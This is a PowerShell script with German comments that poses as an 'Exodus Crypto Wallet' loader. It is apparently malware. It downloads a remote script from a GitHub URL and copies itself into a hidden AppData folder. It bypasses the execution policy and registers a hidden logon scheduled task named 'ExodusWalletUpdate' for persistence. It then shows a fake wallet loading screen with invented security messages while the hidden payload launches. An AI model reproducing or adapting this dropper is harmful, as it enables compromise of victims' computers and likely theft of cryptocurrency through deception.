# Erweiterte Kopier-Funktion mit verbessertem Logging (Console-Ausgabe)
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $Message"
    Write-Host $logEntry -ForegroundColor Cyan
}

Write-Log "Script-Start: Remote-Ausführung erkannt."

# Dynamischer Pfad mit aktuellem User
$currentUser = $env:USERNAME
$targetDir = "C:\Users\$currentUser\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
$targetScriptName = "exodus_wallet.ps1"
$targetScriptPath = Join-Path $targetDir $targetScriptName

Write-Log "Zielordner: $targetDir (User: $currentUser)"

# Zielordner erstellen
if (-not (Test-Path $targetDir)) {
    $parentDir = Split-Path $targetDir -Parent
    if (Test-Path $parentDir) {
        try {
            New-Item -ItemType Directory -Path $targetDir -Force -ErrorAction Stop | Out-Null
            Write-Log "Ordner erfolgreich erstellt: $targetDir"
        } catch {
            Write-Log "Fehler beim Erstellen des Ordners: $($_.Exception.Message)"
            # Fallback-Ordner
            $fallbackDir = Join-Path $env:APPDATA "PowerShell\operations"
            try {
                New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
                $targetDir = $fallbackDir
                $targetScriptPath = Join-Path $fallbackDir $targetScriptName
                Write-Log "Fallback-Ordner erstellt: $fallbackDir"
            } catch {
                Write-Log "Fallback fehlgeschlagen: $($_.Exception.Message)"
            }
        }
    } else {
        Write-Log "Fehler: Parent-Ordner $parentDir existiert nicht."
    }
} else {
    Write-Log "Ordner existiert bereits: $targetDir"
}

# Script-Inhalt für remote Execution
$downloadUrl = "https://raw.githubusercontent.com/H3221/2/main/wallet.ps1"
$tempPath = Join-Path $env:TEMP "wallet_temp_$(Get-Random).ps1"
$currentScriptPath = $null

if ([string]::IsNullOrEmpty($MyInvocation.MyCommand.Path)) {
    Write-Log "Remote-Execution: Lade Script herunter."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $scriptContent = $webClient.DownloadString($downloadUrl)
        Write-Log "Download erfolgreich. Länge: $($scriptContent.Length)"
        
        # Aktuellen erweiterten Inhalt speichern
        $thisScriptContent = $MyInvocation.MyCommand.Definition
        $thisScriptContent | Out-File -FilePath $tempPath -Encoding UTF8 -Force
        $currentScriptPath = $tempPath
        Write-Log "Temp-Script: $tempPath"
    } catch {
        Write-Log "Download-Fehler: $($_.Exception.Message)"
    }
} else {
    $currentScriptPath = $MyInvocation.MyCommand.Path
    Write-Log "Lokale Execution: $currentScriptPath"
}

# Kopieren
$copySuccess = $false
if ($currentScriptPath -and (Test-Path $currentScriptPath)) {
    try {
        $scriptToCopy = Get-Content -Path $currentScriptPath -Raw -Encoding UTF8
        $scriptToCopy | Out-File -FilePath $targetScriptPath -Encoding UTF8 -Force
        $copySuccess = $true
        Write-Log "Kopiert nach $targetScriptPath. Größe: $((Get-Item $targetScriptPath).Length) Bytes"
        
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "Kopier-Fehler: $($_.Exception.Message)"
        # Fallback-Inhalt
        try {
            "# Persistence loaded - GUI Code here`nWrite-Host 'Persistence active!'" | Out-File -FilePath $targetScriptPath -Encoding UTF8 -Force
            Write-Log "Fallback-Inhalt geschrieben."
            $copySuccess = $true
        } catch {
            Write-Log "Fallback fehlgeschlagen."
        }
    }
} else {
    Write-Log "Kein Quellpfad. Kopie übersprungen."
}

if ($copySuccess) {
    Write-Log "Persistence abgeschlossen."
    # Scheduled Task (optional)
    try {
        $taskName = "ExodusWalletUpdate"
        $taskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File `"$targetScriptPath`""
        $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction Stop | Out-Null
        Write-Log "Scheduled Task '$taskName' erstellt."
    } catch {
        Write-Log "Task-Fehler: $($_.Exception.Message)"
    }
} else {
    Write-Log "WARNUNG: Persistence fehlgeschlagen."
}

# Temp aufräumen
if ($tempPath -and (Test-Path $tempPath)) {
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    Write-Log "Temp gelöscht."
}

Write-Log "Starte GUI..."

# GUI-Teil (ohne try-catch in Timern für bessere Parse-Kompatibilität)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true

# Header-Panel mit Gradient
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font("Segoe UI", 44, [System.Drawing.FontStyle]::Bold)
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED")
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $colorStart, $colorEnd, [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)

# GIF
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($gifUrl, $gifPath)
} catch {}
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    try {
        $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
    } catch {}
}
$form.Controls.Add($pictureBox)

# Loading Label
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# Progress Bars
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# Status Label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# Timer Setup
$script:marqueePos = 0
$script:percent = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

# Status Phasen
$authPhaseDuration = 15000
$script:inAuthPhase = $true
$authStartTime = Get-Date
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text = "Performing background security checks..."
$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)
$script:statusIndex = 0
$script:dotCount = 0

# Timer Tick (ohne try-catch für Parse-Sicherheit)
$timer.Add_Tick({
    if ($form.IsDisposed) { $timer.Stop(); return }
    
    if ($script:inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
        $script:inAuthPhase = $false
        $loadingLabel.Text = "Loading wallet"
        $statusLabel.Text = $statuses[0]
    }
    
    $script:marqueePos += 5
    if ($script:marqueePos -gt $progressBg2.Width) { $script:marqueePos = -50 }
    $progressBar2.Left = $script:marqueePos
    
    if ($script:inAuthPhase) { return }
    
    if ($script:percent -lt 100) {
        $script:percent += 0.3
        $progressBar.Width = [int]($progressBg.Width * ($script:percent / 100.0))
    }
    
    if ($script:percent -ge 100) {
        $timer.Stop()
        Start-Sleep -Milliseconds 500
        if (Test-Path $targetScriptPath) {
            Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -File `"$targetScriptPath`"" -ErrorAction SilentlyContinue
        }
        $form.Close()
    }
})

# Label Timer Tick (ohne try-catch)
$labelTimer.Add_Tick({
    if ($form.IsDisposed) { $labelTimer.Stop(); return }
    
    if ($script:inAuthPhase) { return }
    
    $script:dotCount = ($script:dotCount + 1) % 4
    $loadingLabel.Text = "Loading wallet" + ("." * $script:dotCount)
    $script:statusIndex = ($script:statusIndex + 1) % $statuses.Count
    $statusLabel.Text = $statuses[$script:statusIndex]
})

# Cleanup
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
    if (Test-Path $gifPath) { 
        Remove-Item $gifPath -Force -ErrorAction SilentlyContinue 
    }
    Write-Log "GUI geschlossen."
})

$timer.Start()
$labelTimer.Start()
$form.Add_Shown({ $form.Activate() })
$form.ShowDialog() | Out-Null

Write-Log "Script-Ende."
